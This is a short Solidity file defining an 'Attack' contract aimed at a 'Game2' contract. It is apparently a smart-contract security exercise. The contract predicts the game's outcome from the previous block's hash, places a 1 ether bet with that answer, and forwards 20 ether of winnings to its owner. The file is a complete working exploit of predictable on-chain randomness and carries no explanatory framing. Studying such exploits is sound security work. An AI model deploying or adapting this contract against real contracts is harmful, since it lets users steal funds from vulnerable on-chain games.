// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Game2} from "./Game2.sol";

contract Attack {
    Game2 gameContract;
    address payable owner;

    constructor(address _game2) payable {
        gameContract = Game2(_game2);
        owner = payable(msg.sender);
    }

    function attack() external {
        require(msg.sender == owner, "Only owner");

        uint256 value = uint256(blockhash(block.number - 1));
        uint256 random = value % 2;
        bool answer = random == 1 ? true : false;

        gameContract.play{value: 1 ether}(answer);
    }

    receive() external payable {
        (bool sent,) = owner.call{value: 20 ether}("");
        require(sent, "Failed to send ETH");
    }
}
